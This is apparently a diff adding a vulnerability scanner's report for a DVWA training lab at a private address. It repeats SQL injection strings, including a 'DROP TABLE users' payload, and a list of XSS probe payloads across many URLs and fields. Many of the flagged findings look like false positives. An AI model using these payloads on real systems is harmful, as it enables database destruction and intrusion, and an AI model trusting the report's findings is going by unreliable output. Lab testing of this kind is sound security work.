@@ -1,0 +1,1085 @@
+Combined Vulnerability Report for http://10.0.2.4/DVWA/
+
+Summary:
+- SQLi: 103
+- XSS: 633
+- LFI: 180
+- CMD: 158
+
+Total Vulnerabilities: 1074
+
+Details:
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.ko.md
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/sqli
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/csrf
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/xss_s
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=' OR 1=1 --
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=' OR 'a'='a
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=' OR 'x'='x
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect='; DROP TABLE users--
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.zh.md
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/javascript
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/weak_id
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.es.md
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/captcha
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/upload
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=' OR 1=1 --
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=' OR 'a'='a
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=' OR 'x'='x
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page='; DROP TABLE users--
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=' OR 1=1 --
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=' OR 'a'='a
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=' OR 'x'='x
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page='; DROP TABLE users--
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.ar.md
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/upload
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=' OR 1=1 --
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=' OR 'a'='a
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=' OR 'x'='x
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page='; DROP TABLE users--
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/brute
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/javascript
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/open_redirect
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/weak_id
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/authbypass
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/exec
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.pt.md
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli_blind
+[SQLi] No URL parameters found in http://10.0.2.4/instructions.php
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.fr.md
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.id.md
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/cryptography
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_r
+[SQLi] No URL parameters found in http://10.0.2.4/setup.php
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=' OR 1=1 --
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=' OR 'a'='a
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=' OR 'x'='x
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page='; DROP TABLE users--
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/csp
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/xss_d
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=' OR 1=1 --
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=' OR 'a'='a
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=' OR 'x'='x
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc='; DROP TABLE users--
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=' OR 1=1 --
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=' OR 'a'='a
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=' OR 'x'='x
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect='; DROP TABLE users--
+[SQLi] No URL parameters found in http://10.0.2.4/security.php
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_d
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.tr.md
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/compose.yml
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.pl.md
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/config/config.inc.php.dist
+[SQLi] No URL parameters found in http://10.0.2.4
+[SQLi] No URL parameters found in http://10.0.2.4/manual
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=' OR 1=1 --
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=' OR 'a'='a
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=' OR 'x'='x
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc='; DROP TABLE users--
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.vi.md
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/authbypass
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/cryptography
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/instructions.php
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_s
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/about.php
+[SQLi] No URL parameters found in http://10.0.2.4/about.php
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=' OR 1=1 --
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=' OR 'a'='a
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=' OR 'x'='x
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc='; DROP TABLE users--
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/brute
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/sqli_blind
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/phpinfo.php
+[SQLi] No URL parameters found in http://10.0.2.4/phpinfo.php
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/docs/DVWA_v1.3.pdf
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/exec
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/csrf
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/captcha
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/security.php
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/csp
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/setup.php
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=' OR 1=1 --
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=' OR 'a'='a
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=' OR 'x'='x
+[SQLi] No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page='; DROP TABLE users--
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=' OR 1=1 --
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=' OR 'a'='a
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=' OR 'x'='x
+[SQLi] SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc='; DROP TABLE users--
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/open_redirect
+[SQLi] No URL parameters found in http://10.0.2.4/DVWA/README.fa.md
+[SQLi] No URL parameters found in http://10.0.2.4/vulnerabilities/xss_r
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.ko.md
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/sqli (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/csrf (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/xss_s (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1 (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.zh.md
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'token' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'phrase' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'send' (GET) on http://10.0.2.4/DVWA/vulnerabilities/javascript using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.es.md
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/captcha (Status Code: 404)
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'MAX_FILE_SIZE' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'uploaded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Upload' (GET) on http://10.0.2.4/DVWA/vulnerabilities/upload using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.ar.md
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/upload (Status Code: 404)
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'username' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>window.location='javascript:alert(1);'</script>
